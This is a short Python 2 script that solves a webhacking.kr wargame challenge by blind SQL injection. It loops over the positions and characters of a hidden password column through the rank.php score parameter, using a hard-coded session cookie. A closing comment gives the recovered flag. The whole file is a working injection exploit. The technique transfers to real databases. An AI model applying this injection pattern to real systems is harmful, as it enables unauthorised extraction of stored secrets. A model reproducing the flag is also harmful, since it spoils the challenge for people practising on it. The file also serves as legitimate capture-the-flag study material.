import urllib
import httplib
import hashlib

pw=""
for i in range(1,21):
    for c in range(33,128):
        HTTP=httplib.HTTPConnection("webhacking.kr")
        Param=urllib.urlencode({})
        Headers={"Content-Type":"application/x-www-form-urlencoded",
                 "Cookie":"PHPSESSID=bc4730b877a0174a3eef0f693c329912;"}
        HTTP.request("GET","/challenge/web/web-31/rank.php?score=999%20||%20right(left(pAsSw0RdzzzZ,"+str(i)+"),1)="+str(hex(c)),Param,Headers)
        Result=HTTP.getresponse().read()
        if "localhost // 0" in Result:
            pw+=chr(c)
            print pw
            break
        else:
            print "/challenge/web/web-31/rank.php?score=999%20or%20mid(pAsSw0RdzzzZ,"+str(i)+",1)="+str(hex(c))

# pw is "challenge55clear~~kk"
